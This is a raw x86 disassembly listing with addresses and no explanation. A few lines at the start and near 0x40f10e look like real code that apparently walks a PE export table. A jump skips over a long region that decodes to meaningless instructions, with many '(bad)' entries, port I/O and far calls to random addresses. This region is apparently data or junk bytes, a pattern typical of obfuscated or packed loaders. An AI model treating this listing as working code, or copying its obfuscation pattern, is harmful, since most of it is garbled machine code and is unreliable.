  40ece5:	mov    DWORD PTR [ebp-0x14],eax
  40ece8:	mov    eax,DWORD PTR [ebp-0x4]
  40eceb:	mov    ecx,DWORD PTR [ebp-0x14]
  40ecee:	xor    eax,esi
  40ecf0:	add    eax,ebx
  40ecf2:	cmp    ecx,eax
  40ecf4:	je     0x40fd3a
  40ecfa:	mov    eax,DWORD PTR [ebp-0x14]
  40ecfd:	mov    eax,DWORD PTR [eax+0x18]
  40ed00:	mov    DWORD PTR [ebp-0x20],eax
  40ed03:	mov    eax,DWORD PTR [ebp-0x14]
  40ed06:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed09:	add    ecx,DWORD PTR [eax+0x20]
  40ed0c:	mov    DWORD PTR [ebp-0x28],ecx
  40ed0f:	mov    eax,DWORD PTR [ebp-0x14]
  40ed12:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed15:	jmp    0x40f109
  40ed1a:	loopne 0x40ece4
  40ed1c:	or     ebx,DWORD PTR [edx]
  40ed1e:	xor    esp,ecx
  40ed20:	in     eax,dx
  40ed21:	ror    BYTE PTR [esi],cl
  40ed23:	cmp    DWORD PTR [ebx-0x1680bd89],eax
  40ed29:	add    DWORD PTR [esi+eiz*4],0x7d497070
  40ed30:	jo     0x40eda2
  40ed32:	scas   al,BYTE PTR es:[edi]
  40ed33:	pushf  
  40ed34:	and    BYTE PTR [esi+eiz*1+0x1f],dl
  40ed38:	ret    0x569d
  40ed3b:	loopne 0x40ecdb
  40ed3d:	stos   DWORD PTR es:[edi],eax
  40ed3e:	iret   
  40ed3f:	leave  
  40ed40:	lock push eax
  40ed42:	mov    edi,ebx
  40ed44:	jp     0x40ed34
  40ed46:	cs xchg ebx,eax
  40ed48:	les    edx,FWORD PTR [esi+0x23add7df]
  40ed4e:	(bad)  
  40ed4f:	enter  0xb58c,0xc6
  40ed53:	push   ecx
  40ed54:	push   eax
  40ed55:	push   edx
  40ed56:	sbb    edx,DWORD PTR [ecx+0x48]
  40ed59:	jb     0x40ed50
  40ed5b:	sbb    BYTE PTR [ecx+0x0],ah
  40ed5e:	cwde   
  40ed5f:	push   eax
  40ed60:	ror    dl,cl
  40ed62:	mov    ch,0x8
  40ed64:	cmp    al,0x9f
  40ed66:	jne    0x40ed34
  40ed68:	out    dx,eax
  40ed69:	aam    0x58
  40ed6b:	adc    BYTE PTR [eax],al
  40ed6d:	cmp    BYTE PTR [eax+0x556a737],bl
  40ed73:	mov    ebx,0xc795af2
  40ed78:	nop
  40ed79:	cmp    BYTE PTR [ebx],bh
  40ed7b:	mov    ah,0xbc
  40ed7d:	mov    esp,0x332dc58f
  40ed82:	jl     0x40edaf
  40ed84:	xor    BYTE PTR [ecx+0x1bd2a651],ch
  40ed8a:	les    esi,FWORD PTR [ebx+0x686a7ab2]
  40ed90:	sub    BYTE PTR [edx+0x7624c63a],0xdf
  40ed97:	xor    ebx,DWORD PTR [edi]
  40ed99:	in     al,0xa8
  40ed9b:	aad    0x62
  40ed9d:	arpl   WORD PTR [edx-0x71],si
  40eda0:	mov    ebx,0xe1252047
  40eda5:	data16 mov WORD PTR [edi+0x1a2d8ee6],fs
  40edac:	mov    ebx,0x5376cb3
  40edb1:	or     BYTE PTR [edi-0x4a88ba1],bl
  40edb7:	mov    ecx,0x9a74238e
  40edbc:	sub    al,0xc6
  40edbe:	jl     0x40eda8
  40edc0:	hlt    
  40edc1:	cmp    ebx,DWORD PTR [edx+0x251b3506]
  40edc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edc8:	push   0x75
  40edca:	xchg   edx,eax
  40edcb:	int    0x79
  40edcd:	cmp    ebp,eax
  40edcf:	enter  0xcad4,0xdf
  40edd3:	sbb    BYTE PTR [ebx],dl
  40edd5:	cmp    al,0x52
  40edd7:	outs   dx,DWORD PTR ds:[esi]
  40edd8:	femms  
  40edda:	push   eax
  40eddb:	out    dx,al
  40eddc:	loopne 0x40ed69
  40edde:	mov    dh,0xfa
  40ede0:	push   esp
  40ede1:	lods   al,BYTE PTR ds:[esi]
  40ede2:	ins    BYTE PTR es:[edi],dx
  40ede3:	xor    BYTE PTR [ebx+0x7a5ced1a],al
  40ede9:	arpl   sp,sp
  40edeb:	xchg   BYTE PTR [edx+0x51cd1749],ch
  40edf1:	scas   al,BYTE PTR es:[edi]
  40edf2:	adc    cl,BYTE PTR [edi-0x1c6087b9]
  40edf8:	pusha  
  40edf9:	cmp    BYTE PTR [edi-0x367ee867],0xc2
  40ee00:	call   0x895:0xff5ad970
  40ee07:	push   cs
  40ee08:	inc    edx
  40ee09:	call   0x75db:0x24425503
  40ee10:	loopne 0x40ee4e
  40ee12:	sbb    eax,edx
  40ee14:	mov    DWORD PTR [esi+eiz*1+0x49a23a24],edx
  40ee1b:	rcr    DWORD PTR [edi],cl
  40ee1d:	xadd   DWORD PTR fs:[ebp+0x7f],esi
  40ee22:	aaa    
  40ee23:	ins    DWORD PTR es:[edi],dx
  40ee24:	sub    edi,esi
  40ee26:	jae    0x40ee5a
  40ee28:	dec    DWORD PTR [eax-0x11]
  40ee2b:	arpl   WORD PTR [edi+ebx*4],sp
  40ee2e:	in     eax,dx
  40ee2f:	int3   
  40ee30:	dec    edi
  40ee31:	enter  0x2eea,0x5e
  40ee35:	lds    ebx,FWORD PTR ss:[esi]
  40ee38:	aaa    
  40ee39:	jg     0x40ee39
  40ee3b:	xchg   ecx,eax
  40ee3c:	inc    edx
  40ee3d:	pop    edx
  40ee3e:	shl    edx,cl
  40ee40:	mov    esp,0xcca80e17
  40ee45:	sub    eax,DWORD PTR [esi]
  40ee47:	ror    DWORD PTR [ebx],cl
  40ee49:	ins    DWORD PTR es:[edi],dx
  40ee4a:	ins    BYTE PTR es:[edi],dx
  40ee4b:	dec    esi
  40ee4c:	je     0x40ee6d
  40ee4e:	popa   
  40ee4f:	cwde   
  40ee50:	jae    0x40ee45
  40ee52:	add    eax,0xb0a5fc1e
  40ee57:	nop
  40ee58:	rcl    DWORD PTR [ecx-0xe],1
  40ee5b:	fwait
  40ee5c:	xchg   DWORD PTR cs:[ecx+0x2dc659ea],edx
  40ee63:	xchg   ecx,eax
  40ee64:	xor    eax,0xc2e878cb
  40ee69:	add    DWORD PTR [ebp-0x39],ebx
  40ee6c:	or     BYTE PTR [ebx+0x4483f587],ah
  40ee72:	xchg   esp,eax
  40ee73:	neg    BYTE PTR [eax]
  40ee75:	pop    eax
  40ee76:	fnstenv [esi]
  40ee78:	sti    
  40ee79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee7a:	imul   ecx,esi,0xfffffffb
  40ee7d:	mov    esi,0x5b8f81d5
  40ee82:	hlt    
  40ee83:	cmp    BYTE PTR [ecx*2+0x347bcfe8],0xca
  40ee8b:	test   BYTE PTR gs:[ecx],ch
  40ee8e:	inc    esi
  40ee8f:	sub    eax,0x506a92b4
  40ee94:	int    0x96
  40ee96:	jmp    0xbde9b784
  40ee9b:	aad    0xeb
  40ee9d:	sub    al,0xb1
  40ee9f:	mov    WORD PTR [eax+0x4f],es
  40eea2:	je     0x40eed6
  40eea4:	adc    al,0x9
  40eea6:	sub    eax,0xb87d9023
  40eeab:	les    esi,FWORD PTR [ecx-0x4e6f8f46]
  40eeb1:	jmp    0x71db6a6b
  40eeb6:	in     al,dx
  40eeb7:	jno    0x40eeb0
  40eeb9:	call   0x2f8c:0xba395cb
  40eec0:	adc    esi,esi
  40eec2:	std    
  40eec3:	out    0xf8,eax
  40eec5:	bound  ebp,QWORD PTR [esi-0x3f]
  40eec8:	imul   esi,esp,0x14
  40eecb:	pushf  
  40eecc:	pop    edx
  40eecd:	fisttp WORD PTR gs:[edi]
  40eed0:	jo     0x40eed6
  40eed2:	xchg   DWORD PTR [edx+0x18],eax
  40eed5:	rcr    edi,cl
  40eed7:	mov    dl,0xf3
  40eed9:	imul   ecx,DWORD PTR [eax],0xffffffaf
  40eedc:	jg     0x40ef4c
  40eede:	test   dl,dh
  40eee0:	pop    ss
  40eee1:	pop    ecx
  40eee2:	jecxz  0x40ee99
  40eee4:	ret    0x8f43
  40eee7:	jg     0x40eec0
  40eee9:	mov    ah,0x93
  40eeeb:	or     ebx,edx
  40eeed:	sahf   
  40eeee:	mov    ebp,0x8581af84
  40eef3:	lods   al,BYTE PTR ds:[esi]
  40eef4:	idiv   bh
  40eef6:	dec    edx
  40eef7:	push   edi
  40eef8:	sub    eax,0xb8101f2e
  40eefd:	sbb    eax,0xbfbf1a57
  40ef02:	inc    ecx
  40ef03:	(bad)  
  40ef04:	bound  edi,QWORD PTR [edx+0x29]
  40ef07:	fidivr DWORD PTR [ebp+ebx*8+0x1b]
  40ef0b:	(bad)  
  40ef0c:	jl     0x40ef05
  40ef0e:	sbb    al,0x95
  40ef10:	push   esi
  40ef11:	add    al,0x59
  40ef13:	cmp    ch,BYTE PTR [esi+0x30ad401f]
  40ef19:	mov    eax,0x66eada90
  40ef1e:	enter  0xb13d,0x5d
  40ef22:	fld    DWORD PTR [edx-0x2e]
  40ef25:	jnp    0x40eee2
  40ef27:	push   0x7
  40ef29:	lea    ecx,[ecx-0x75]
  40ef2c:	arpl   WORD PTR [ecx],sp
  40ef2e:	stos   BYTE PTR es:[edi],al
  40ef2f:	nop
  40ef30:	into   
  40ef31:	call   0xf493e7f3
  40ef36:	mov    bh,0x1e
  40ef38:	xor    ch,BYTE PTR [eax]
  40ef3a:	gs adc al,0x4d
  40ef3d:	fnstsw WORD PTR [ebx]
  40ef3f:	jae    0x40eef9
  40ef41:	xchg   esi,eax
  40ef42:	mov    ch,0x1f
  40ef44:	mov    eax,0x7f5fbeb5
  40ef49:	jns    0x40ef6e
  40ef4b:	mov    esi,DWORD PTR [esi-0x67]
  40ef4e:	xor    BYTE PTR [edi+0x7c],dh
  40ef51:	dec    ebx
  40ef52:	loope  0x40ef24
  40ef54:	into   
  40ef55:	or     al,0xbf
  40ef57:	cwde   
  40ef58:	ins    DWORD PTR es:[edi],dx
  40ef59:	repz test edx,0xa4ca3aff
  40ef60:	mov    ds:0xf2889e27,eax
  40ef65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef66:	mov    dh,0xcf
  40ef68:	rcr    DWORD PTR [ebp+0x31],0x6
  40ef6c:	or     al,0x79
  40ef6e:	aas    
  40ef6f:	mov    ds:0x37c2deb2,al
  40ef74:	or     eax,0xe8c02757
  40ef79:	mov    ebp,0x40e43835
  40ef7e:	fstp   QWORD PTR [edx]
  40ef80:	xor    BYTE PTR [eax+0x49],bl
  40ef83:	scas   eax,DWORD PTR es:[edi]
  40ef84:	xor    DWORD PTR [edx],edx
  40ef86:	aam    0xec
  40ef88:	call   0xc696:0x5bd00c16
  40ef8f:	daa    
  40ef90:	mov    esp,0x18e5ea17
  40ef95:	dec    edx
  40ef96:	mov    edi,0x9d4ba88e
  40ef9b:	mov    ds:0x669012f,al
  40efa0:	and    DWORD PTR [ecx+0x2863dd63],ebp
  40efa6:	adc    DWORD PTR [edi+0x23f17d1e],esp
  40efac:	xchg   esi,eax
  40efad:	mov    ebp,0x3e82a942
  40efb2:	mov    ah,0xa0
  40efb4:	ret    0xa9cc
  40efb7:	fcmovu st,st(3)
  40efb9:	nop
  40efba:	fnsave [edx]
  40efbc:	mov    esi,0xd45a786d
  40efc1:	(bad)  
  40efc2:	adc    dl,BYTE PTR [esi-0x183dcf91]
  40efc8:	lods   eax,DWORD PTR ds:[esi]
  40efc9:	mov    al,0x8b
  40efcb:	test   eax,0x4e7ce34a
  40efd0:	stos   DWORD PTR es:[edi],eax
  40efd1:	loope  0x40f034
  40efd3:	inc    BYTE PTR [ecx+0x778be776]
  40efd9:	lahf   
  40efda:	cmp    ch,BYTE PTR [ebx]
  40efdc:	add    ebp,DWORD PTR [ebx+0x30]
  40efdf:	push   edx
  40efe0:	pop    edi
  40efe1:	xor    ah,BYTE PTR [ebx+0x50]
  40efe4:	mov    ecx,DWORD PTR [edx+0x3825bae9]
  40efea:	lahf   
  40efeb:	mov    ch,0x25
  40efed:	jle    0x40efe4
  40efef:	(bad)  
  40eff0:	and    ch,BYTE PTR [edx-0x5d23d30a]
  40eff6:	mov    BYTE PTR [edx+0x7a],ah
  40eff9:	(bad)  
  40effa:	pop    ecx
  40effb:	adc    cl,BYTE PTR [ebx+0x78]
  40effe:	daa    
  40efff:	sbb    bl,BYTE PTR [edi]
  40f001:	add    dl,cl
  40f003:	je     0x40f078
  40f005:	dec    esp
  40f006:	fimul  DWORD PTR [ebp+0x2615fc40]
  40f00c:	sub    BYTE PTR [esi],0xa5
  40f00f:	clc    
  40f010:	pop    ebx
  40f011:	fisttp WORD PTR [esi]
  40f013:	shl    DWORD PTR [ebp+0x5913e12c],1
  40f019:	jmp    0xd3d5f5bf
  40f01e:	pop    edi
  40f01f:	outs   dx,DWORD PTR ds:[esi]
  40f020:	fst    QWORD PTR [esi-0x27570d79]
  40f026:	(bad)  
  40f027:	je     0x40f002
  40f029:	sbb    eax,0x7514c15b
  40f02e:	aaa    
  40f02f:	xchg   esp,eax
  40f030:	stos   DWORD PTR es:[edi],eax
  40f031:	add    eax,0x1edfd913
  40f036:	pop    esi
  40f037:	mov    BYTE PTR [ecx+0xcee0231],al
  40f03d:	stc    
  40f03e:	sbb    al,BYTE PTR [eax+0x4f]
  40f041:	inc    edx
  40f042:	pop    ds
  40f043:	loope  0x40f065
  40f045:	inc    edi
  40f046:	and    cl,cl
  40f048:	jns    0x40f069
  40f04a:	mov    esi,0xe15155ec
  40f04f:	gs jae 0x40f03d
  40f052:	pop    edi
  40f053:	push   edi
  40f054:	sbb    al,0xa5
  40f056:	push   ebx
  40f057:	pop    eax
  40f058:	fisttp DWORD PTR [ebx-0x45]
  40f05b:	test   al,0x82
  40f05d:	dec    ecx
  40f05e:	inc    ebx
  40f05f:	cmp    ch,ah
  40f061:	fst    QWORD PTR [ebx-0x7d53f597]
  40f067:	ds pop ds
  40f069:	(bad)  
  40f06a:	ins    DWORD PTR es:[edi],dx
  40f06b:	fwait
  40f06c:	inc    ebx
  40f06d:	(bad)  
  40f06e:	dec    ebp
  40f06f:	jecxz  0x40f0ef
  40f071:	pop    eax
  40f072:	ret    0xc1d0
  40f075:	push   0xffffffc7
  40f077:	inc    esp
  40f078:	jg     0x40f07f
  40f07a:	(bad)  
  40f07b:	fiadd  WORD PTR [esi+0x2c]
  40f07e:	(bad)
  40f083:	push   ecx
  40f084:	xchg   ebp,eax
  40f085:	push   esp
  40f086:	or     al,0xc8
  40f088:	cmp    DWORD PTR [esi-0x22],ebx
  40f08b:	call   FWORD PTR [esi]
  40f08d:	xor    bh,BYTE PTR [ebp-0x58edbdf7]
  40f093:	xor    esp,DWORD PTR [ecx+edi*1-0x24]
  40f097:	adc    ch,BYTE PTR [edx+0x7f]
  40f09a:	mov    ebx,0xc2c67500
  40f09f:	mov    DWORD PTR [eax+0x6c],edi
  40f0a2:	das    
  40f0a3:	int    0x15
  40f0a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0a6:	jno    0x40f0b2
  40f0a8:	inc    esp
  40f0a9:	lahf   
  40f0aa:	outs   dx,DWORD PTR ds:[esi]
  40f0ab:	add    cl,BYTE PTR [edi+edx*1+0x6b]
  40f0af:	test   DWORD PTR [edx],0xcdbda4d3
  40f0b5:	adc    BYTE PTR [ecx],dh
  40f0b7:	jg     0x40f0b2
  40f0b9:	mov    edi,0xc830c3b9
  40f0be:	aaa    
  40f0bf:	mov    ds:0xd2d7f072,al
  40f0c4:	jmp    0x40f0bc
  40f0c6:	adc    BYTE PTR [esi-0x48],cl
  40f0c9:	(bad)  
  40f0cb:	sbb    esi,esi
  40f0cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0ce:	loop   0x40f0be
  40f0d0:	popa   
  40f0d1:	mov    al,0xa
  40f0d3:	mov    ds:0x52be7fb2,eax
  40f0d8:	sbb    esi,DWORD PTR [edi+0x2e]
  40f0db:	enter  0x268d,0xf2
  40f0df:	xlat   BYTE PTR ds:[ebx]
  40f0e0:	mov    edx,0x467daca3
  40f0e5:	xor    bl,BYTE PTR [edi+0x37069c33]
  40f0eb:	fld    TBYTE PTR fs:[ebp+ecx*2-0x553d297a]
  40f0f3:	mov    edi,0xf8dc7e49
  40f0f8:	add    bh,bl
  40f0fa:	push   0xbda1655a
  40f0ff:	stos   DWORD PTR es:[edi],eax
  40f100:	iret   
  40f101:	fidiv  WORD PTR [eax+ebp*8+0x76fb9f2e]
  40f108:	mov    esi,0x89244803
  40f10d:	dec    ebp
  40f10e:	aam    0x8b
  40f110:	inc    ebp
  40f111:	in     al,dx
  40f112:	mov    ecx,DWORD PTR [ebp+0x8]
  40f115:	add    ecx,DWORD PTR [eax+0x1c]
  40f118:	jmp    0x40f50c
  40f11d:	inc    ecx
  40f11e:	jae    0x40f19a
  40f120:	pop    ebp
  40f121:	sub    dh,BYTE PTR [ebp+0x61]
  40f124:	jae    0x40f173
  40f126:	and    ebp,DWORD PTR [eax]
  40f128:	mov    bh,0xa9
  40f12a:	call   0x7070:0xa35dce2e
  40f131:	dec    ecx
  40f132:	jge    0x40f1a4
  40f134:	jo     0x40f10c
  40f136:	test   eax,0xfc850e36
  40f13b:	jmp    0x2f24e22
  40f140:	enter  0xae0d,0x6e
  40f144:	(bad)  
  40f145:	sbb    al,0xc6
  40f147:	pop    ebp
  40f148:	rcl    ebx,1
  40f14a:	mov    bh,0xea
  40f14c:	pop    esp
  40f14d:	dec    esi
  40f14e:	or     eax,DWORD PTR [esi+0x1945adee]
  40f154:	cmp    BYTE PTR [ebp-0x7d874f29],dl
  40f15a:	mov    eax,0x55f657d7
  40f15f:	daa    
  40f160:	add    eax,0x46b540cf
  40f165:	pop    ds
  40f166:	pop    ds
  40f167:	inc    DWORD PTR [ecx]
  40f169:	retf   0xc5ad
  40f16c:	lea    esp,[edx]
  40f16e:	xchg   ebp,eax
  40f16f:	shr    DWORD PTR [ecx+0x63],cl
  40f172:	adc    DWORD PTR [edi+0x64165d06],esi
  40f178:	push   0x34ea1fc6
  40f17d:	jl     0x40f106
  40f17f:	mov    ebp,0x6d96c1bd
  40f184:	xor    al,BYTE PTR [esp+ecx*2+0x79]
  40f188:	sar    BYTE PTR [edx],0xdd
  40f18b:	cs sub eax,0xa37efc76
  40f191:	ins    DWORD PTR es:[edi],dx
  40f192:	mov    eax,0x6ad39341
  40f197:	adc    ebx,0x1
  40f19a:	push   ebx
  40f19b:	mov    bh,BYTE PTR [ebx+0x210f326b]
  40f1a1:	xchg   esi,eax
  40f1a2:	or     cl,BYTE PTR [edi+edx*8-0x69]
  40f1a6:	and    DWORD PTR cs:[edx+0xd],ebp
  40f1aa:	mov    ch,0xa2
  40f1ac:	add    bh,BYTE PTR [ecx+edx*1+0x57]
  40f1b0:	and    BYTE PTR [edx+0x7c],ah
  40f1b3:	inc    edi
  40f1b4:	dec    esi
  40f1b5:	out    0x24,al
  40f1b7:	rcl    BYTE PTR [edi+0x4285c0d1],0x2c
  40f1be:	loopne 0x40f233
  40f1c0:	dec    esi
  40f1c1:	cmp    bl,dl
  40f1c3:	es iret 
  40f1c5:	mov    dh,0x78
  40f1c7:	loope  0x40f1fa
  40f1c9:	xchg   ecx,eax
  40f1ca:	rcl    BYTE PTR [ebx],cl
  40f1cc:	aad    0x62
  40f1ce:	inc    ebx
  40f1cf:	fcmovb st,st(5)
  40f1d1:	xor    eax,0x466c2e50
  40f1d6:	pop    ebp
  40f1d7:	xor    eax,0xf77b1470
  40f1dc:	mov    eax,ds:0x6b6ee4d2
  40f1e1:	in     al,0x1d
  40f1e3:	sub    cl,dh
  40f1e5:	jmp    0x5a42:0xa9eb07a8
  40f1ec:	or     ebp,DWORD PTR [esi]
  40f1ee:	mov    ebp,0xddb92f05
  40f1f3:	xor    ebp,DWORD PTR [edx-0x1b26b3f6]
  40f1f9:	pop    edx
  40f1fa:	mov    ebp,0xe706ec25
  40f1ff:	pop    ebx
  40f200:	(bad)
  40f203:	stc    
  40f204:	fcomp  DWORD PTR [esi+0x6bb6e003]
  40f20a:	(bad)  
  40f20b:	je     0x40f259
  40f20d:	push   esp
  40f20e:	(bad)  
  40f20f:	in     eax,dx
  40f210:	(bad)  
  40f211:	or     al,0xa4
  40f213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f214:	test   DWORD PTR [ecx+esi*8],ecx
  40f217:	push   esp
  40f218:	aaa    
  40f219:	push   edi
  40f21a:	or     eax,0x1ad7b139
  40f21f:	push   edi
  40f220:	imul   ebp,DWORD PTR [ecx-0x5e],0x0
  40f224:	ja     0x40f1d1
  40f226:	scas   al,BYTE PTR es:[edi]
  40f227:	mov    edi,0xf79c9af5
  40f22c:	pop    ds
  40f22d:	cs out dx,eax
  40f22f:	pop    ebp
  40f230:	dec    edi
  40f231:	pop    ss
  40f232:	cmp    al,0x64
  40f234:	sbb    BYTE PTR [edi],ah
  40f236:	jl     0x40f1e8
  40f238:	gs dec eax
  40f23a:	lea    esi,[ebx]
  40f23c:	pop    esi
  40f23d:	or     ecx,DWORD PTR [eax+0x25ad2dca]
  40f243:	inc    esp
  40f244:	mov    esi,0x20705c2f
  40f249:	sbb    al,0x52
  40f24b:	test   DWORD PTR [esp+eiz*8],ebp
  40f24e:	pushf  
  40f24f:	inc    ecx
  40f250:	outs   dx,DWORD PTR ds:[esi]
  40f251:	jb     0x40f1d9
  40f253:	mov    eax,0xc2f43b4c
  40f258:	mov    dh,0x6b
  40f25a:	shl    ebx,cl
  40f25c:	xor    edi,DWORD PTR [esi]
  40f25e:	push   edi
  40f25f:	mov    ds:0x58eb00cb,al
  40f264:	or     al,0x8c
  40f266:	outs   dx,BYTE PTR ds:[esi]
  40f267:	pop    esi
  40f268:	cmc    
  40f269:	lds    esi,FWORD PTR [ebx]
  40f26b:	fsub   QWORD PTR [edi+0x30]
  40f26e:	push   es
  40f26f:	push   es
  40f270:	imul   edx,DWORD PTR [ebx],0x34
  40f273:	mov    al,ds:0x6b13dfe2
  40f278:	sbb    ebp,DWORD PTR [ecx+0x78]
  40f27b:	push   0x5184f610
  40f280:	xchg   BYTE PTR [eax],bl
  40f282:	xor    BYTE PTR ds:[eax-0xf],ch
  40f286:	adc    eax,0xbd9e95c3
  40f28b:	xchg   DWORD PTR [esi],eax
  40f28d:	cmp    eax,0xd6777b7b
  40f292:	jp     0x40f2df
  40f294:	js     0x40f2c8
  40f296:	leave  
  40f297:	xchg   esp,eax
  40f298:	bswap  ebp
  40f29a:	mov    ds:0x1ed025e3,al
  40f29f:	dec    edi
  40f2a0:	sbb    ah,BYTE PTR [edx]
  40f2a2:	add    DWORD PTR [edi+0x58],esp
  40f2a5:	test   al,0x1e
  40f2a7:	jle    0x40f26d
  40f2a9:	or     eax,0xfe5bc551
  40f2af:	cmp    edx,DWORD PTR [ecx-0x5]
  40f2b2:	xchg   ecx,ebx
  40f2b4:	shl    DWORD PTR [ebx-0x3f],1
  40f2b7:	(bad)  
  40f2b8:	jo     0x40f2bf
  40f2ba:	idiv   BYTE PTR gs:0x4e616a2e
  40f2c1:	stos   BYTE PTR es:[edi],al
  40f2c2:	xchg   BYTE PTR [eax+0x761a1cc8],ch
  40f2c8:	mov    ecx,ebx
  40f2ca:	mov    WORD PTR ds:0x9ecb19aa,ss
  40f2d0:	pop    eax
  40f2d1:	inc    esp
  40f2d2:	mov    fs,WORD PTR [ecx+0xd]
  40f2d5:	and    esi,DWORD PTR [edi-0x8de2975]
  40f2db:	xchg   edi,eax
  40f2dc:	xchg   BYTE PTR [ecx+0x29e86bfa],bh
  40f2e2:	cmc    
  40f2e3:	sar    DWORD PTR [edi+0x5d],0x75
  40f2e7:	pop    edx
  40f2e8:	push   esp
  40f2e9:	stos   DWORD PTR es:[edi],eax
  40f2ea:	push   es
  40f2eb:	mov    BYTE PTR [edi+0x3fde4c9b],dl
  40f2f1:	imul   eax,eax,0xb4422e77
  40f2f7:	inc    edx
  40f2f9:	jmp    0x40f320
  40f2fb:	out    dx,al
  40f2fc:	stos   BYTE PTR es:[edi],al
  40f2fd:	xchg   DWORD PTR [edi-0x5634660e],edi
  40f303:	inc    esi
  40f304:	xchg   ebx,eax
  40f305:	fisttp QWORD PTR [edi-0x3eeda941]
  40f30b:	xor    al,0x35
  40f30d:	arpl   WORD PTR [edx-0x6f12315],sp
  40f313:	inc    eax
  40f314:	jne    0x40f391
  40f316:	lahf   
  40f317:	adc    edx,edi
  40f319:	add    cl,dl
  40f31b:	call   0xa47e36ff
  40f320:	cmp    al,al
  40f322:	sbb    al,0xad
  40f324:	add    DWORD PTR [ebx],ebx
  40f326:	arpl   WORD PTR [ecx],bx
  40f328:	cmp    DWORD PTR [eax+0x76e0003c],0x7aa78195
  40f332:	je     0x40f335
  40f334:	push   esi
  40f335:	idiv   BYTE PTR [ecx+0x35]
  40f338:	call   0xac02bcf9
  40f33d:	aaa    
  40f33e:	fwait
  40f33f:	adc    DWORD PTR [ebp-0x52],ebp
  40f342:	xor    BYTE PTR [eax-0x4c],dh
  40f345:	das    
  40f346:	push   ebp
  40f347:	and    al,0xbd
  40f349:	fistp  DWORD PTR [ecx-0xc598ba2]
  40f34f:	mov    esi,0x66e23ba7
  40f354:	mov    bh,BYTE PTR [esi+0x67]
  40f357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f358:	push   cs
  40f359:	fimul  DWORD PTR [ebp+ebp*1+0x55aabf6f]
  40f360:	aam    0xe0
  40f362:	jne    0x40f364
  40f364:	jle    0x40f3b9
  40f366:	xchg   ebx,eax
  40f367:	cmp    eax,0x67d6a3e2
  40f36c:	cmp    al,0x8a
  40f36e:	aas    
  40f36f:	fst    QWORD PTR [esi]
  40f371:	jns    0x40f32f
  40f373:	xor    esp,edx
  40f375:	or     DWORD PTR [edi+0x60e1aae8],esp
  40f37b:	xchg   esi,eax
  40f37c:	mov    esp,0x8bbb138
  40f381:	mov    esp,0x2f998bd4
  40f386:	js     0x40f398
  40f388:	test   eax,0xb1340f6f
  40f38d:	mov    cl,0x19
  40f38f:	dec    esi
  40f390:	and    BYTE PTR fs:[ebx+0x2a461415],dl
  40f397:	xlat   BYTE PTR ds:[ebx]
  40f398:	mov    bl,0xd5
  40f39a:	push   ss
  40f39b:	push   ss
  40f39c:	add    al,BYTE PTR [edi-0x4f74fbce]
  40f3a2:	cmc    
  40f3a3:	inc    esp
  40f3a4:	mov    eax,0xc56137cc
  40f3a9:	sbb    DWORD PTR [eax],ecx
  40f3ab:	outs   dx,DWORD PTR ds:[esi]
  40f3ac:	mov    WORD PTR [edx+0x1c],ss
  40f3af:	or     esi,DWORD PTR [ecx+0x30]
  40f3b2:	or     DWORD PTR [edi],eax
  40f3b4:	cmp    ebp,edi
  40f3b6:	ficom  DWORD PTR [edi-0x36]
  40f3b9:	fisttp QWORD PTR [edi]
  40f3bb:	call   0x5dc10043
  40f3c0:	test   esi,edx
  40f3c2:	mov    esp,0xafb69440
  40f3c7:	push   edx
  40f3c8:	sub    al,0x71
  40f3ca:	xchg   edx,eax
  40f3cb:	cwde   
  40f3cc:	mov    ecx,0x39bd78e8
  40f3d1:	ins    DWORD PTR es:[edi],dx
  40f3d2:	adc    bh,BYTE PTR [ecx+eax*8]
  40f3d5:	jb     0x40f450
  40f3d7:	add    al,0x8b
  40f3d9:	test   al,0x73
  40f3db:	xchg   BYTE PTR gs:[ebx+edx*4-0x1e],ah
  40f3e0:	push   0x7c
  40f3e2:	jns    0x40f3e7
  40f3e4:	lahf   
  40f3e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3e6:	icebp  
  40f3e7:	arpl   WORD PTR [edi+0x4368d993],bp
  40f3ed:	and    eax,DWORD PTR [esi-0x5e]
  40f3f0:	push   edi
  40f3f1:	and    DWORD PTR [esi+0x46],ebp
  40f3f4:	and    esp,DWORD PTR [edx-0x600f4c4e]
  40f3fa:	jb     0x40f403
  40f3fc:	sub    al,BYTE PTR [eax]
  40f3fe:	adc    al,0x86
  40f400:	xchg   BYTE PTR [esi+edx*4+0x7c],dh
  40f404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f405:	jns    0x40f439
  40f407:	pop    ecx
  40f408:	inc    ebp
  40f409:	in     eax,dx
  40f40a:	xor    al,0xef
  40f40c:	lds    ecx,FWORD PTR [edi-0x12]
  40f40f:	xchg   ecx,eax
  40f410:	adc    eax,0xcda00f03
  40f415:	mov    BYTE PTR [ebp+esi*8+0x59],al
  40f419:	jae    0x40f3b8
  40f41b:	add    DWORD PTR [eax],0x736b8b37
  40f421:	add    BYTE PTR ds:0x102ecc60,bh
  40f427:	sar    BYTE PTR [ecx+0x6066eaca],1
  40f42d:	dec    ebx
  40f42e:	mov    al,0x72
  40f430:	(bad)  
  40f431:	mov    ebp,0xfbe47c10
  40f436:	xchg   DWORD PTR [edi],esi
  40f438:	out    dx,eax
  40f439:	retf   
  40f43a:	scas   eax,DWORD PTR es:[edi]
  40f43b:	in     al,dx
  40f43c:	lahf   
  40f43d:	fdivrp st(6),st
  40f43f:	pop    ebx
  40f440:	xor    ebp,DWORD PTR [ebx]
  40f442:	(bad)  
  40f444:	jle    0x40f3fc
  40f446:	jmp    0x5612:0xc9ad71c3
  40f44d:	add    BYTE PTR [edx-0xf],ch
  40f450:	fist   DWORD PTR [ebx+0x617ed87d]
  40f456:	xchg   edi,eax
  40f457:	icebp  
  40f458:	aaa    
  40f459:	mov    bh,0x27
  40f45b:	call   esi
  40f45d:	mov    ds:0x22cf3253,eax
  40f462:	inc    ebx
  40f463:	push   0x7
  40f465:	ins    DWORD PTR es:[edi],dx
  40f466:	bound  eax,QWORD PTR [edi-0x40]
